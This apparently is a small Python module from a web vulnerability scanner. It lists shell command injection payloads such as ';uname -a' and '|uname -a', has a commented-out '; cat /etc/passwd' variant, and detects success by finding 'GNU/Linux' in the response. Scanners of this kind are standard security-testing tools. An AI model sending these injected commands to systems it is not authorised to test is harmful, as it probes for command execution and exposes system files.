import re

## add url encode and other payloads

def get_all():
	payloads = [";uname -a", "|uname -a", "&uname -a", "%3Bname -a"]
	# payloads = [";uname -a",";ls -al", "; cat /etc/passwd"]

	payloads = [(item, "Shell Command Injection") for item in payloads]
	return payloads

def checkSuccess(html):
	match = re.findall(r'GNU/Linux', html)
	if len(match) == 0:
		return False
	return True
	
if __name__ == "__main__":	
	print get_all()
